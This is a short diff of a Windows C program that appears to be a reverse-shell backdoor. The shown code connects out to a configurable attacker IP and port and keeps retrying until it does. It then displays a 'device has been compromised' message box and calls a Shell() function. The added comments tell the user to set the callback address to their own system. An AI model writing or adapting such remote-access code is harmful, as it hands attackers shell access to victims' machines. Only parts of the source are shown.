@@ -143,8 +143,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	char *ServIP;
 	WSADATA wsaData;
 
-	ServIP = "192.168.0.102";
-	ServPort = 50005;
+	ServIP = "192.168.0.102"; //Change this IP to your system IP 
+	ServPort = 50005; // Change this port number to any open port on your system
 
 	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
 		exit(1);
@@ -164,6 +164,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 		Sleep(10);
 		goto start;
 	}
-	MessageBox(NULL, TEXT("Your Device Has Been Hacked!!!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
+	MessageBox(NULL, TEXT("This device has been compromised. It is a bruh moment"), TEXT("dh00mk3tu - Forward Unto Dawn"), MB_OK | MB_ICONERROR);
 	Shell();
 }
